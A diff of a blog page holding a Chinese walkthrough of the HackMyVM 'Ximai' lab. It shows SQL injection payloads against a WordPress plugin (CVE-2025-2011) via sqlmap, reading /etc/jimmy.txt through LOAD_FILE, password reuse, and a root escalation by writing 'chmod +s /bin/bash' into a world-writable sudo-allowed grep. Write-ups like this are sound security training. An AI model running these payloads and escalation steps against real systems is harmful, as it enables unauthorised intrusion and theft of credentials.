@@ -128,7 +128,7 @@ MySQL服务拒绝远程连接，需要寻找其他入口。">
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/hmv_Ximai.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>hmv_Ximai</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -152,7 +152,17 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
 </style>
 
 
@@ -187,19 +197,18 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
 <h2>网络扫描</h2>
 <p>首先进行网络发现，寻找目标主机：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l
 ...
 192.168.205.131 08:00:27:f4:eb:fa       PCS Systemtechnik GmbH
-...
-</code></pre>
-<p>发现目标IP：<code>192.168.205.131</code></p>
+...</pre></div>
+<p>发现目标IP：<code class="notranslate">192.168.205.131</code></p>
 <h2>端口扫描</h2>
 <p>对目标进行全端口扫描：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p0-65535 192.168.205.131            
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 06:55 EDT
-Nmap scan report for SOUPEDECODE.LOCAL (192.168.205.131)
+Nmap scan report <span class="pl-k">for</span> SOUPEDECODE.LOCAL (192.168.205.131)
 Host is up (0.000082s latency).
 Not shown: 65532 closed tcp ports (reset)
 PORT     STATE SERVICE
@@ -209,8 +218,7 @@ PORT     STATE SERVICE
 8000/tcp open  http-alt
 MAC Address: 08:00:27:F4:EB:FA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
-Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
-</code></pre>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.00 seconds</pre></div>
 <p>开放端口：</p>
 <ul>
 <li>22/tcp - SSH服务</li>
@@ -221,80 +229,74 @@ Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
 <h1>二、服务枚举</h1>
 <h2>MySQL服务测试</h2>
 <p>尝试连接MySQL服务：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ mysql -h 192.168.205.131 -u root -p 
 Enter password: 
-ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.205.128' is not allowed to connect to this MariaDB server
-</code></pre>
+ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host <span class="pl-s"><span class="pl-pds">'</span>192.168.205.128<span class="pl-pds">'</span></span> is not allowed to connect to this MariaDB server</pre></div>
 <p>MySQL服务拒绝远程连接，需要寻找其他入口。</p>
 <h2>Web服务分析（80端口）</h2>
 <p>访问80端口显示Apache2默认页面，进行目录扫描：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ dirsearch -u 192.168.205.131     
 ...
 [07:15:39] 200 -    2KB - /adminer.php
 [07:15:46] 200 -   23KB - /info.php
-...
-</code></pre>
+...</pre></div>
 <p>继续使用gobuster进行更详细的扫描：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ gobuster dir -u http://192.168.205.131 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64 
 ...
 /index.html           (Status: 200) [Size: 10938]
 /info.php             (Status: 200) [Size: 85870]
 /reminder.php         (Status: 200) [Size: 3163]
 /server-status        (Status: 403) [Size: 280]
-...
-</code></pre>
+...</pre></div>
 <p>发现的重要文件：</p>
 <ul>
-<li><code>/adminer.php</code> - Adminer 5.3.0数据库管理工具</li>
-<li><code>/info.php</code> - PHP信息页面</li>
-<li><code>/reminder.php</code> - 提醒页面</li>
+<li><code class="notranslate">/adminer.php</code> - Adminer 5.3.0数据库管理工具</li>
+<li><code class="notranslate">/info.php</code> - PHP信息页面</li>
+<li><code class="notranslate">/reminder.php</code> - 提醒页面</li>
 </ul>
 <h2>分析reminder.php页面</h2>
-<p>访问<code>/reminder.php</code>，发现包含重要信息：</p>
-<pre lang="html"><code>&lt;div class=&quot;container&quot;&gt;
-    &lt;h1&gt;Web Portal&lt;/h1&gt;
-    &lt;p class=&quot;hint-text&quot;&gt;
+<p>访问<code class="notranslate">/reminder.php</code>，发现包含重要信息：</p>
+<div class="highlight highlight-text-html-basic"><pre class="notranslate"><span class="pl-kos">&lt;</span><span class="pl-ent">div</span> <span class="pl-c1">class</span>="<span class="pl-s">container</span>"<span class="pl-kos">&gt;</span>
+    <span class="pl-kos">&lt;</span><span class="pl-ent">h1</span><span class="pl-kos">&gt;</span>Web Portal<span class="pl-kos">&lt;/</span><span class="pl-ent">h1</span><span class="pl-kos">&gt;</span>
+    <span class="pl-kos">&lt;</span><span class="pl-ent">p</span> <span class="pl-c1">class</span>="<span class="pl-s">hint-text</span>"<span class="pl-kos">&gt;</span>
         jimmy! Don't forget we need to harden the security on the web server. In case you have forgotten your access details, I've put them in a txt file for you. It's in that place where I put that thing that time.
-    &lt;/p&gt;
+    <span class="pl-kos">&lt;/</span><span class="pl-ent">p</span><span class="pl-kos">&gt;</span>
 
-    &lt;img src=&quot;that-place-where-i-put-that-thing-that-time/1b260614-3aff-11f0-ac81-000c2921b441.jpg&quot; alt=&quot;Mysterious Image&quot;&gt;
+    <span class="pl-kos">&lt;</span><span class="pl-ent">img</span> <span class="pl-c1">src</span>="<span class="pl-s">that-place-where-i-put-that-thing-that-time/1b260614-3aff-11f0-ac81-000c2921b441.jpg</span>" <span class="pl-c1">alt</span>="<span class="pl-s">Mysterious Image</span>"<span class="pl-kos">&gt;</span>
 
-    &lt;p&gt;
+    <span class="pl-kos">&lt;</span><span class="pl-ent">p</span><span class="pl-kos">&gt;</span>
         Also, can you fix this search box? Sometimes it chucks errors depending on what I enter...
-    &lt;/p&gt;
-    &lt;p class=&quot;hint-text&quot;&gt;
+    <span class="pl-kos">&lt;/</span><span class="pl-ent">p</span><span class="pl-kos">&gt;</span>
+    <span class="pl-kos">&lt;</span><span class="pl-ent">p</span> <span class="pl-c1">class</span>="<span class="pl-s">hint-text</span>"<span class="pl-kos">&gt;</span>
         I'd do it myself, but I've been busy trying to create some code to enable us to securely store our passwords, seeing as you keep forgetting yours... The encoder seems completely borked though.
-    &lt;/p&gt;
+    <span class="pl-kos">&lt;/</span><span class="pl-ent">p</span><span class="pl-kos">&gt;</span>
 
-    &lt;form action=&quot;reminder.php&quot; method=&quot;POST&quot;&gt;
-        &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;
-        &lt;input type=&quot;submit&quot; value=&quot;Lookup User&quot;&gt;
-    &lt;/form&gt;
-&lt;/div&gt;
-</code></pre>
+    <span class="pl-kos">&lt;</span><span class="pl-ent">form</span> <span class="pl-c1">action</span>="<span class="pl-s">reminder.php</span>" <span class="pl-c1">method</span>="<span class="pl-s">POST</span>"<span class="pl-kos">&gt;</span>
+        <span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">type</span>="<span class="pl-s">text</span>" <span class="pl-c1">name</span>="<span class="pl-s">username</span>" <span class="pl-c1">placeholder</span>="<span class="pl-s">Username</span>"<span class="pl-kos">&gt;</span>
+        <span class="pl-kos">&lt;</span><span class="pl-ent">input</span> <span class="pl-c1">type</span>="<span class="pl-s">submit</span>" <span class="pl-c1">value</span>="<span class="pl-s">Lookup User</span>"<span class="pl-kos">&gt;</span>
+    <span class="pl-kos">&lt;/</span><span class="pl-ent">form</span><span class="pl-kos">&gt;</span>
+<span class="pl-kos">&lt;/</span><span class="pl-ent">div</span><span class="pl-kos">&gt;</span></pre></div>
 <p>页面提供了重要线索：</p>
 <ol>
 <li>Jimmy的访问凭据存储在txt文件中</li>
-<li>路径提示：<code>that-place-where-i-put-that-thing-that-time/</code></li>
+<li>路径提示：<code class="notranslate">that-place-where-i-put-that-thing-that-time/</code></li>
 </ol>
 <p>访问该路径，发现目录列表：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl http://192.168.205.131/that-place-where-i-put-that-thing-that-time/
 ...
-lrwxrwxrwx 1 root root   15 May 17 18:42 creds.txt -&gt; /etc/jimmy.txt
-...
-</code></pre>
-<p>发现<code>creds.txt</code>是指向<code>/etc/jimmy.txt</code>的软链接。</p>
+lrwxrwxrwx 1 root root   15 May 17 18:42 creds.txt -<span class="pl-k">&gt;</span> /etc/jimmy.txt
+...</pre></div>
+<p>发现<code class="notranslate">creds.txt</code>是指向<code class="notranslate">/etc/jimmy.txt</code>的软链接。</p>
 <h2>Web服务分析（8000端口）</h2>
-<p>访问8000端口发现是WordPress站点，但域名跳转到<code>wordpress.local</code>，需要添加到hosts文件：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ echo &quot;192.168.205.131 wordpress.local&quot; &gt;&gt; /etc/hosts
-</code></pre>
+<p>访问8000端口发现是WordPress站点，但域名跳转到<code class="notranslate">wordpress.local</code>，需要添加到hosts文件：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>192.168.205.131 wordpress.local<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> /etc/hosts</pre></div>
 <p>WordPress站点包含一篇重要文章，提示系统存在安全问题：</p>
-<pre><code>Dear Developer, We Need to Talk…
+<pre class="notranslate"><code class="notranslate">Dear Developer, We Need to Talk…
 
 While casually browsing your blog system, I couldn't help but notice a few… quirks.
 
@@ -311,132 +313,119 @@ A Concerned Internet Wanderer
 </code></pre>
 <p>文章暗示：</p>
 <ol>
-<li><code>mysqli.allow_local_infile = On</code> 配置可能存在安全风险</li>
+<li><code class="notranslate">mysqli.allow_local_infile = On</code> 配置可能存在安全风险</li>
 <li>WordPress插件存在SQL注入漏洞</li>
 </ol>
 <h1>三、漏洞发现与利用</h1>
 <h2>漏洞扫描</h2>
 <p>使用nuclei进行漏洞扫描：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nuclei -u http://wordpress.local:8000/
 ...
-[CVE-2025-2011:dbname] [http] [high] http://wordpress.local:8000/wp-admin/admin-ajax.php?s=9999')union+select+111,222,(select(concat(0x44617461626173653a20,database()))),4444,+5--+-&amp;perpage=20&amp;page=1&amp;orderBy=source_id&amp;dateEnd&amp;dateStart&amp;order=DESC&amp;sources&amp;action=depicter-lead-index [&quot;wordpress&quot;]
-...
-</code></pre>
-<p>发现CVE-2025-2011漏洞，这是一个WordPress插件的SQL注入漏洞。</p>
+[CVE-2025-2011:dbname] [http] [high] http://wordpress.local:8000/wp-admin/admin-ajax.php<span class="pl-k">?</span>s=9999<span class="pl-s"><span class="pl-pds">'</span>)union+select+111,222,(select(concat(0x44617461626173653a20,database()))),4444,+5--+-&amp;perpage=20&amp;page=1&amp;orderBy=source_id&amp;dateEnd&amp;dateStart&amp;order=DESC&amp;sources&amp;action=depicter-lead-index ["wordpress"]</span>
+<span class="pl-s">...</span></pre></div>
+<p>发现<a title="CVE-2025-2011" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-84xp-2wxp-xq57/hovercard" href="https://github.com/advisories/GHSA-84xp-2wxp-xq57">CVE-2025-2011</a>漏洞，这是一个WordPress插件的SQL注入漏洞。</p>
 <h2>SQL注入利用</h2>
 <h3>检测注入点</h3>
 <p>使用sqlmap验证并利用SQL注入漏洞：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ sqlmap -u &quot;http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&amp;action=depicter-lead-index&quot; -p s --dbs --batch
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sqlmap -u <span class="pl-s"><span class="pl-pds">"</span>http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&amp;action=depicter-lead-index<span class="pl-pds">"</span></span> -p s --dbs --batch
 ...
 Parameter: s (GET)
     Type: time-based blind
-    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: s=test') AND (SELECT 1426 FROM (SELECT(SLEEP(5)))CoXd) AND ('Jhem'='Jhem&amp;action=depicter-lead-index
+    Title: MySQL <span class="pl-k">&gt;</span>= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: s=test<span class="pl-s"><span class="pl-pds">'</span>) AND (SELECT 1426 FROM (SELECT(SLEEP(5)))CoXd) AND (<span class="pl-pds">'</span></span>Jhem<span class="pl-s"><span class="pl-pds">'</span>=<span class="pl-pds">'</span></span>Jhem<span class="pl-k">&amp;</span>action=depicter-lead-index
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 5 columns
-    Payload: s=test') UNION ALL SELECT CONCAT(0x71786b7071,0x72534350746463506a707173537277566e717679657645616d6c774751594a486675525970544a54,0x717a6a7171),NULL,NULL,NULL,NULL-- -&amp;action=depicter-lead-index
-...
-available databases [5]:
-[*] information_schema
-[*] mysql
-[*] performance_schema
-[*] wordpress
-[*] zabbix
-</code></pre>
+    Payload: s=test<span class="pl-s"><span class="pl-pds">'</span>) UNION ALL SELECT CONCAT(0x71786b7071,0x72534350746463506a707173537277566e717679657645616d6c774751594a486675525970544a54,0x717a6a7171),NULL,NULL,NULL,NULL-- -&amp;action=depicter-lead-index</span>
+<span class="pl-s">...</span>
+<span class="pl-s">available databases [5]:</span>
+<span class="pl-s">[*] information_schema</span>
+<span class="pl-s">[*] mysql</span>
+<span class="pl-s">[*] performance_schema</span>
+<span class="pl-s">[*] wordpress</span>
+<span class="pl-s">[*] zabbix</span></pre></div>
 <h3>获取WordPress用户信息</h3>
 <p>提取WordPress用户表数据：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ sqlmap -u &quot;http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&amp;action=depicter-lead-index&quot; -p s -D wordpress -T wp_users --dump       
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sqlmap -u <span class="pl-s"><span class="pl-pds">"</span>http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&amp;action=depicter-lead-index<span class="pl-pds">"</span></span> -p s -D wordpress -T wp_users --dump       
 ...
 Database: wordpress
 Table: wp_users
 [1 entry]
 +----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+
-| ID | user_url | user_pass                                                       | user_email      | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+<span class="pl-k">|</span> ID <span class="pl-k">|</span> user_url <span class="pl-k">|</span> user_pass                                                       <span class="pl-k">|</span> user_email      <span class="pl-k">|</span> user_login <span class="pl-k">|</span> user_status <span class="pl-k">|</span> display_name <span class="pl-k">|</span> user_nicename <span class="pl-k">|</span> user_registered     <span class="pl-k">|</span> user_activation_key <span class="pl-k">|</span>
 +----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+
-| 1  | &lt;blank&gt;  | $wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq | no@thankyou.com | adminer    | 0           | adminer      | adminer       | 2025-05-28 10:35:26 | &lt;blank&gt;             |
-+----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+
-</code></pre>
-<p>获得用户：<code>adminer</code>，密码哈希：<code>$wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq</code></p>
+<span class="pl-k">|</span> 1  <span class="pl-k">|</span> <span class="pl-k">&lt;</span>blank<span class="pl-k">&gt;</span>  <span class="pl-k">|</span> <span class="pl-smi">$wp</span><span class="pl-smi">$2</span>y<span class="pl-smi">$1</span>0<span class="pl-smi">$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq</span> <span class="pl-k">|</span> no@thankyou.com <span class="pl-k">|</span> adminer    <span class="pl-k">|</span> 0           <span class="pl-k">|</span> adminer      <span class="pl-k">|</span> adminer       <span class="pl-k">|</span> 2025-05-28 10:35:26 <span class="pl-k">|</span> <span class="pl-k">&lt;</span>blank<span class="pl-k">&gt;</span>             <span class="pl-k">|</span>
++----+----------+-----------------------------------------------------------------+-----------------+------------+-------------+--------------+---------------+---------------------+---------------------+</pre></div>
+<p>获得用户：<code class="notranslate">adminer</code>，密码哈希：<code class="notranslate">$wp$2y$10$ylcSQukwQZAMcFcQTmFzVuJhcr6CoEflSJs6pSiA9OG0JWOpAEYVq</code></p>
 <h3>读取系统文件</h3>
-<p>利用MySQL的LOAD_FILE函数读取<code>/etc/jimmy.txt</code>：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ sqlmap -u &quot;http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&amp;action=depicter-lead-index&quot; -p s --sql-query &quot;SELECT LOAD_FILE('/etc/jimmy.txt')&quot; --batch
+<p>利用MySQL的LOAD_FILE函数读取<code class="notranslate">/etc/jimmy.txt</code>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sqlmap -u <span class="pl-s"><span class="pl-pds">"</span>http://wordpress.local:8000/wp-admin/admin-ajax.php?s=test&amp;action=depicter-lead-index<span class="pl-pds">"</span></span> -p s --sql-query <span class="pl-s"><span class="pl-pds">"</span>SELECT LOAD_FILE('/etc/jimmy.txt')<span class="pl-pds">"</span></span> --batch
 ...
-SELECT LOAD_FILE('/etc/jimmy.txt'): 'HandsomeHU\n'
-</code></pre>
-<p>成功获取jimmy用户密码：<code>HandsomeHU</code></p>
+SELECT LOAD_FILE(<span class="pl-s"><span class="pl-pds">'</span>/etc/jimmy.txt<span class="pl-pds">'</span></span>): <span class="pl-s"><span class="pl-pds">'</span>HandsomeHU\n<span class="pl-pds">'</span></span></pre></div>
+<p>成功获取jimmy用户密码：<code class="notranslate">HandsomeHU</code></p>
 <h1>四、系统访问</h1>
 <h2>SSH登录</h2>
 <p>使用获取的凭据登录SSH：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ ssh jimmy@192.168.205.131                                                                                                                                    
-jimmy@192.168.205.131's password: 
-Linux Ximai 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
-...
-jimmy@Ximai:~$ echo $PATH
-./...
-</code></pre>
+jimmy@192.168.205.131<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
+<span class="pl-s">Linux Ximai 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
+<span class="pl-s">...</span>
+<span class="pl-s">jimmy@Ximai:~$ echo $PATH</span>
+<span class="pl-s">./...</span></pre></div>
 <p>发现PATH环境变量被限制，需要重新设置：</p>
-<pre lang="bash"><code>jimmy@Ximai:~$ export PATH=&quot;/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&quot;
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">jimmy@Ximai:<span class="pl-k">~</span>$ <span class="pl-k">export</span> PATH=<span class="pl-s"><span class="pl-pds">"</span>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games<span class="pl-pds">"</span></span></pre></div>
 <h2>信息收集</h2>
 <p>检查sudo权限和系统信息：</p>
-<pre lang="bash"><code>jimmy@Ximai:~$ sudo -l
-Sorry, user jimmy may not run sudo on Ximai.
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">jimmy@Ximai:<span class="pl-k">~</span>$ sudo -l
+Sorry, user jimmy may not run sudo on Ximai.</pre></div>
 <p>查看WordPress配置文件：</p>
-<pre lang="bash"><code>jimmy@Ximai:/var/www/wordpress$ cat wp-config.php 
+<div class="highlight highlight-source-shell"><pre class="notranslate">jimmy@Ximai:/var/www/wordpress$ cat wp-config.php 
 ...
-/**
- * adminer:adminer123456
- */
+/<span class="pl-k">**</span>
+ <span class="pl-k">*</span> adminer:adminer123456
+ <span class="pl-k">*</span>/
 
-// ** Database settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
-define( 'DB_NAME', 'wordpress' );
+// <span class="pl-k">**</span> Database settings - You can get this info from your web host <span class="pl-k">**</span> //
+/<span class="pl-k">**</span> The name of the database <span class="pl-k">for</span> WordPress <span class="pl-k">*</span>/
+define( <span class="pl-s"><span class="pl-pds">'</span>DB_NAME<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>wordpress<span class="pl-pds">'</span></span> )<span class="pl-k">;</span>
 
-/** Database username */
-define( 'DB_USER', 'root' );
+/<span class="pl-k">**</span> Database username <span class="pl-k">*</span>/
+define( <span class="pl-s"><span class="pl-pds">'</span>DB_USER<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>root<span class="pl-pds">'</span></span> )<span class="pl-k">;</span>
 
-/** Database password */
-define( 'DB_PASSWORD', 'SuperSecret' );
-...
-</code></pre>
-<p>在配置文件中发现adminer用户的明文密码：<code>adminer123456</code></p>
+/<span class="pl-k">**</span> Database password <span class="pl-k">*</span>/
+define( <span class="pl-s"><span class="pl-pds">'</span>DB_PASSWORD<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>SuperSecret<span class="pl-pds">'</span></span> )<span class="pl-k">;</span>
+...</pre></div>
+<p>在配置文件中发现adminer用户的明文密码：<code class="notranslate">adminer123456</code></p>
 <h1>五、权限提升</h1>
 <h2>切换用户</h2>
 <p>使用获取的密码切换到adminer用户：</p>
-<pre lang="bash"><code>jimmy@Ximai:/tmp$ su adminer
+<div class="highlight highlight-source-shell"><pre class="notranslate">jimmy@Ximai:/tmp$ su adminer
 Password: 
 adminer@Ximai:/tmp$ sudo -l
-Matching Defaults entries for adminer on Ximai:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+Matching Defaults entries <span class="pl-k">for</span> adminer on Ximai:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
 
 User adminer may run the following commands on Ximai:
-    (ALL) NOPASSWD: /usr/bin/grep
-</code></pre>
+    (ALL) NOPASSWD: /usr/bin/grep</pre></div>
 <h2>利用sudo权限</h2>
-<p>发现adminer用户可以以root权限执行<code>/usr/bin/grep</code>命令，但存在限制。检查grep文件权限：</p>
-<pre lang="bash"><code>adminer@Ximai:/tmp$ ls -la /usr/bin/grep
--rwxr-xrwx 1 root root 19 Aug 30 23:32 /usr/bin/grep
-</code></pre>
+<p>发现adminer用户可以以root权限执行<code class="notranslate">/usr/bin/grep</code>命令，但存在限制。检查grep文件权限：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">adminer@Ximai:/tmp$ ls -la /usr/bin/grep
+-rwxr-xrwx 1 root root 19 Aug 30 23:32 /usr/bin/grep</pre></div>
 <p>发现grep文件具有写权限，可以覆盖其内容：</p>
-<pre lang="bash"><code>adminer@Ximai:/tmp$ echo 'chmod +s /bin/bash' &gt; /usr/bin/grep
+<div class="highlight highlight-source-shell"><pre class="notranslate">adminer@Ximai:/tmp$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>chmod +s /bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /usr/bin/grep
 adminer@Ximai:/tmp$ sudo /usr/bin/grep
 adminer@Ximai:/tmp$ ls -al /bin/bash
--rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
-</code></pre>
+-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash</pre></div>
 <p>成功为bash文件设置SUID权限，获取root权限：</p>
-<pre lang="bash"><code>adminer@Ximai:/tmp$ bash -p
+<div class="highlight highlight-source-shell"><pre class="notranslate">adminer@Ximai:/tmp$ bash -p
 bash-5.0# cat /root/r00t.txt /home/jimmy/us3r.txt 
 flag{root-126e5653-3b02-11f0-b074-000c2921b441}
-flag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}
-</code></pre>
-</div>
+flag{user-ffbea0a7-3b01-11f0-9160-000c2921b441}</pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -461,7 +450,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 